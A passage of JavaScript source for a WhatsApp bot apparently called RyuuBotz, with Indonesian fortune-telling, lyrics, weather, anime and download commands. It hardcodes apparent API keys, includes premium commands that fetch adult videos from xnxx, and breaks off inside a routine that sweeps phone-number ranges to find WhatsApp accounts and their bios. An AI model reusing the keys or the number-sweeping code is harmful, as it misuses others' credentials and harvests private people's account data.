reply(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {
if (!text) return reply(`Contoh : ${prefix + command} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!text) return reply(`Contoh : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
RyuuBotz.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (!text) return reply(`Contoh : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {
if (!ext)return reply(`Contoh : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
}
break
case  ' rejeki': case 'rezeki': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case '.pekerjaan': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!text) return reply(`Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case '.potensipenyakit': case '.penyakit': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
RyuuBotz.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
if (!text) return `Contoh : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {
if (!text) return reply(`Contoh : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {
if (!text) return reply(`Contoh : ${prefix + command} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'masasubur': {
if (!text) return reply(`Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {
if (!text) return reply(`Contoh : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
reply(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {
if (!text) return reply(`Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message}`)
}
break

case 'myip': {
        if (!isRyuuTheCreator) return reply(mess.only.owner)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
    replyReinzID("🔎 Ip Andreas Anda Adalah: " + ip)
})
})
            }
        break
        case 'mathquiz': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesion Yang Belum Di Selesaikan.")
let { genMath, modes } = require('./lib/math')
if (!text) return replyReinzID(`Mode: ${Object.keys(modes).join(' | ')}\npilih Contoh: ${prefix}math medium`)
let result = await genMath(text.toLowerCase())
RyuuBotz.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
replyReinzID("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
            }
            break
            case 'lirik':
            case 'lyrics': {
if (!text) return reply(`Lirik apa yang Anda cari?\nContoh penggunaan: ${prefix}lyrics Thunder`)
reply(mess.wait)
const hasil = await fetchJson(`https://api.vreden.web.id/api/lirik?lagu=${encodeURIComponent(text)}`)
const xeonlirik = `
*Lyrics :* ${hasil.result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg')}, { upload: RyuuBotz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363419382206255@newsletter',
                  newsletterName: "𝐑𝐲𝐮𝐮𝐑𝐞𝐢𝐧𝐳𝐙 𝕆𝕗𝕗𝕚𝕔𝕚𝕒𝕝 𝕌𝕡𝕕𝕒𝕥𝕖",
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await RyuuBotz.relayMessage(m.chat, msgs.message, {})
}
break
case 'gdrive': {
		if (!args[0]) return replyReinzID(`Silakan Masukan Link gdrive Anda`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replyReinzID(`
≡ *Google Drive Download*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	RyuuBotz.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('yah Error kak laporankan ke owner agar di perbaiki')
  }
}
break
case 'invite': {
	if (!m.isGroup) return reply(mess.only.group)
	if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!text) return replyReinzID(`Silakan Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix + command}* 62xxxxxxxx`)
if (text.includes('+')) return replyReinzID(`Enter the number together without *+*`)
if (isNaN(text)) return replyReinzID(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await RyuuBotz.groupInviteCode(group)
      await RyuuBotz.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replyReinzID(` An invite link is sent to the user`) 
}
break
case 'xnxxdl': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replyReinzID(`Enter Url`)
        if (!text.includes('xnxx.com')) return replyReinzID(`Enter an xnxx link`)
        reply(mess.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
            console.log(xn)
RyuuBotz.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌 Judul*: ${xn.title}
▢ *🗂️ Size*: ${xn.size}
▢ *⌚Duration* ${xn.ruration}
▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: m })
}
break
case 'xnxxsearch': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replyReinzID(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replyReinzID(ff)
              }
              break
case 'ringtone': {
		if (!text) return replyReinzID(`Contoh : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		RyuuBotz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case 'genshin':
if (!text) return replyReinzID(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nama:* ${anime.name}\n`
txt += `🎖️ *Judul:* ${anime.title}\n`
txt += `💠 *Versi:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://endpoint.web.id/search/genshin-character?key=Dinz/${a}/portrait`
await RyuuBotz.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replyReinzID('Error')
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await RyuuBotz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await RyuuBotz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await RyuuBotz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await RyuuBotz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
	case 'anime': {
if (!text) return replyReinzID(`Anime Apa Yang Anda Cari?`)
const malScraper = require('mal-scraper')
reply(mess.wait)
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replyReinzID(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
await RyuuBotz.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
}
break
case 'animevideo': 
case 'amv': {
    if (!text) return reply('Masukan Nomornya Kak\nContoh: .amv 1')
    reply(mess.wait)
async function animeVideo() {
    const url = 'https://shortstatusvideos.com/anime-video-status-download/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);
    const videos = [];
    $('a.mks_button.mks_button_small.squared').each((index, element) => {
        const href = $(element).attr('href');
        const title = $(element).closest('p').prevAll('p').find('strong').text();
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}

async function animeVideo2() {
    const url = 'https://mobstatus.com/anime-whatsapp-status-video/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);

    const videos = [];

    const title = $('strong').text();

    $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
        const href = $(element).attr('href');
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}
    if (text == '1') {
        try {
            let resl = await animeVideo()
            let cap = `Nih Kak Videonya`
            await RyuuBotz.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2()
            let cap = `Nih Kak Videonya`
            await RyuuBotz.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
}
break
case 'imdb':
if (!text) return replyReinzID(`_Name a Series or movie`)
reply(mess.wait)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           RyuuBotz.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break
case 'cuaca':
case 'weather':{
    if (!text) return replyReinzID('🌍 Eh, lokasi mana nih yang mau dicek cuacanya?')

    let wdata = await axios.get(
        `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
    );

    let textw = "";
    textw += `*🌤️✨ Cuaca di ${text} Sekarang! ✨🌤️*\n\n`;
    textw += `🌡️ *Suhu:* ${wdata.data.main.temp}°C (Terasa seperti ${wdata.data.main.feels_like}°C)\n`;
    textw += `🌥️ *Kondisi Cuaca:* ${wdata.data.weather[0].main}\n`;
    textw += `📝 *Deskripsi:* ${wdata.data.weather[0].description}\n`;
    textw += `💨 *Kecepatan Angin:* ${wdata.data.wind.speed} m/s — siap-siap topi terbang! 🎩💨\n`;
    textw += `📊 *Tekanan Udara:* ${wdata.data.main.pressure} hPa\n`;
    textw += `💧 *Kelembapan:* ${wdata.data.main.humidity}%\n`;
    textw += `📍 *Koordinat Lokasi:* \n   - *Latitude:* ${wdata.data.coord.lat}°\n   - *Longitude:* ${wdata.data.coord.lon}°\n`;
    textw += `🏳️ *Negara:* ${wdata.data.sys.country}\n\n`;
    textw += `Jangan lupa bawa payung kalau cuaca lagi gak bersahabat ya! ☔\n`;

    RyuuBotz.sendMessage(
        m.chat, {
            text: textw,
        }, {
            quoted: m,
        }
    );
}
break;
           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replyReinzID(`Provide Number with last number x\n\nContoh: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replyReinzID(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
